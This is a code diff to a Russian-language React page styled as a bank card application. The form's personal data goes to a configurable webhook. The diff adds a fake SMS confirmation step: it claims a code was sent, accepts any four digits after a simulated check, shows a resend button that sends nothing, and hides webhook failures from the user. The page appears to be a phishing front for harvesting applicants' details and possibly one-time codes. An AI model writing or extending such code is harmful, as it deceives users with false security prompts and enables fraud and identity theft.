@@ -17,7 +17,7 @@ import {
 const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
 const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';
 
-type Step = 'form' | 'success';
+type Step = 'form' | 'sms' | 'success';
 
 // Таблица транслитерации русских букв в латинские
 const translitMap: { [key: string]: string } = {
@@ -85,6 +85,8 @@ const Bank = () => {
     birthDate: '',
     agreeTerms: false,
   });
+
+  const [smsCode, setSmsCode] = useState('');
 
   // Генерируем номер карты и дату один раз при загрузке
   const [cardNumber] = useState(() => generateCardNumber());
@@ -222,23 +224,123 @@ const Bank = () => {
         },
         body: JSON.stringify(payload),
       });
-
-      setStep('success');
-      toast({
-        title: "Заявка отправлена!",
-        description: "Мы свяжемся с вами в ближайшее время",
-      });
     } catch (error) {
       console.error('Webhook error:', error);
-      setStep('success');
-      toast({
-        title: "Заявка принята!",
-        description: "Данные успешно отправлены",
-      });
     } finally {
       setIsLoading(false);
+      setStep('sms');
+      toast({
+        title: "Код отправлен",
+        description: "SMS с кодом подтверждения отправлен на ваш номер",
+      });
     }
   };
+
+  const handleSmsSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    if (smsCode.length !== 4) {
+      toast({
+        title: "Ошибка",
+        description: "Введите 4-значный код из SMS",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsLoading(true);
+
+    // Имитация проверки кода
+    await new Promise(resolve => setTimeout(resolve, 1000));
+
+    setIsLoading(false);
+    setStep('success');
+    toast({
+      title: "Заявка отправлена!",
+      description: "Мы свяжемся с вами в ближайшее время",
+    });
+  };
+
+  const handleSmsCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    setSmsCode(value);
+  };
+
+  // SMS verification screen
+  if (step === 'sms') {
+    return (
+      <div className="min-h-screen bg-white flex items-center justify-center p-4">
+        <div className="max-w-md w-full">
+          <button
+            onClick={() => setStep('form')}
+            className="flex items-center gap-2 text-gray-500 hover:text-gray-700 mb-8"
+          >
+            <ArrowLeft className="w-4 h-4" />
+            Назад
+          </button>
+
+          <div className="text-center mb-8">
+            <div className="w-16 h-16 bg-gradient-to-br from-[#00D4FF] to-[#0066FF] rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
+              <ShieldCheck className="w-8 h-8 text-white" />
+            </div>
+            <h2 className="text-2xl font-medium text-gray-900 mb-2">Подтверждение</h2>
+            <p className="text-gray-500">
+              Введите код из SMS, отправленный на номер
+            </p>
+            <p className="text-gray-900 font-medium">+7 {formData.phone}</p>
+          </div>
+
+          <form onSubmit={handleSmsSubmit} className="space-y-6">
+            <div className="space-y-2">
+              <Label htmlFor="smsCode" className="text-gray-500 text-sm font-normal">
+                Код из SMS
+              </Label>
+              <Input
+                id="smsCode"
+                value={smsCode}
+                onChange={handleSmsCodeChange}
+                placeholder="____"
+                maxLength={4}
+                className="h-14 rounded-lg border-gray-200 bg-white text-gray-900 text-center text-2xl tracking-[0.5em] font-mono focus:border-[#0066FF] focus:ring-0"
+                autoFocus
+              />
+            </div>
+
+            <Button
+              type="submit"
+              disabled={isLoading || smsCode.length !== 4}
+              className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg disabled:opacity-50"
+            >
+              {isLoading ? (
+                <div className="flex items-center gap-2">
+                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                  Проверка...
+                </div>
+              ) : (
+                'Подтвердить'
+              )}
+            </Button>
+
+            <p className="text-center text-sm text-gray-400">
+              Не получили код?{' '}
+              <button
+                type="button"
+                className="text-[#0066FF] hover:underline"
+                onClick={() => {
+                  toast({
+                    title: "Код отправлен повторно",
+                    description: "Новый SMS с кодом отправлен на ваш номер",
+                  });
+                }}
+              >
+                Отправить повторно
+              </button>
+            </p>
+          </form>
+        </div>
+      </div>
+    );
+  }
 
   // Success screen
   if (step === 'success') {
@@ -264,6 +366,7 @@ const Bank = () => {
                 birthDate: '',
                 agreeTerms: false,
               });
+              setSmsCode('');
             }}
             className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
           >
